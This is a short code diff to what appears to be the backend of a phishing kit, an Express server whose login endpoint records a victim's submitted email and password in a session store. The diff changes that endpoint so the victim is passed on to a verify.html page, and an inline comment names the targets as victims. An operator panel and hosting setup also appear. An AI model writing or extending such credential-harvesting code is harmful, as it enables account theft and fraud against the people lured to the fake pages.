@@ -271,9 +271,15 @@ app.post('/api/login', async (req, res) => {
     const { sid, email, password } = req.body;
     if (!email?.trim() || !password?.trim()) return res.sendStatus(400);
     if (!sessionsMap.has(sid)) return res.sendStatus(404);
+
     const v = sessionsMap.get(sid);
-    v.entered = true; v.email = email; v.password = password;
-    v.status = 'wait'; v.attempt += 1; v.totalAttempts += 1;
+    v.entered = true;
+    v.email = email;
+    v.password = password;
+    v.status = 'ok'; // <-- Set status to 'ok' to allow the victim to proceed
+    v.page = 'verify.html'; // <-- Update the page to 'verify.html'
+    v.attempt += 1;
+    v.totalAttempts += 1;
     sessionActivity.set(sid, Date.now());
 
     v.activityLog = v.activityLog || [];
@@ -536,4 +542,5 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`Panel user: ${PANEL_USER}`);
   currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
 });
+
 
